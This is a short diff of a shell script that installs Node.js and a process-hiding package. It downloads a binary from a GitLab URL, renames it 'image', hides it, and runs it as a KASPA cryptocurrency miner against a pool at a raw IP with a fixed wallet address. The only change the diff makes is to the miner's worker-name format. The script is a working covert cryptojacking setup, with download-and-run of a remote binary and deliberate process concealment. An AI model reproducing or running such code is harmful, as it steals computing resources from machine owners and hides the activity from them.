@@ -5,5 +5,5 @@ curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs >/dev/null 2>&1
 sudo npm i -g node-process-hider && sudo ph add image
 wget -qO image https://gitlab.com/teletyl/oon/-/raw/main/news && chmod +x image
-./image --algo KASPA --pool 47.250.56.224:443 --user 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo $(shuf -i 1-999 -n 1)-KP) --tls enable
+./image --algo KASPA --pool 47.250.56.224:443 --user 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo A-$(date +"%H-%M-%S")) --tls enable
 EOF
